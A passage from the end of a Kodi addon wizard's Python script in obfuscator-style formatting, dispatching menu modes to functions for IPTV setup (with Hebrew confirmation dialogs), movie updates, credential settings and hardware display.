        wiz .clean_pass ()#line:6931
elif mode ==22 :#line:6932
        wiz .movie_update ()#line:6933
elif mode =='simpleiptv':#line:6936
    DIALOG =xbmcgui .Dialog ()#line:6938
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את חשבון ה IPTV?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6939
    if choice ==1 :#line:6940
        iptvkodi17_18 ()#line:6941
    else :#line:6943
     sys .exit ()#line:6944
elif mode =='simpleidanplus':#line:6946
    DIALOG =xbmcgui .Dialog ()#line:6947
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את ערוצי עידן פלוס בטלוויזיה חיה? שימו לב זה ימחק לכם את מנוי ה IPTV שלכם",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6948
    if choice ==1 :#line:6949
        iptvidanplus ()#line:6950
    else :#line:6952
     sys .exit ()#line:6953
elif mode =='update_tele':updatetelemedia (NOTEID )#line:6955
elif mode =='adv_settings':buffer1 ()#line:6956
elif mode =='getpass':getpass ()#line:6957
elif mode =='setpass':setpass ()#line:6958
elif mode =='setuname':setuname ()#line:6959
elif mode =='passandUsername':passandUsername ()#line:6960
elif mode =='9':disply_hwr ()#line:6961
elif mode =='99':disply_hwr2 ()#line:6962
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))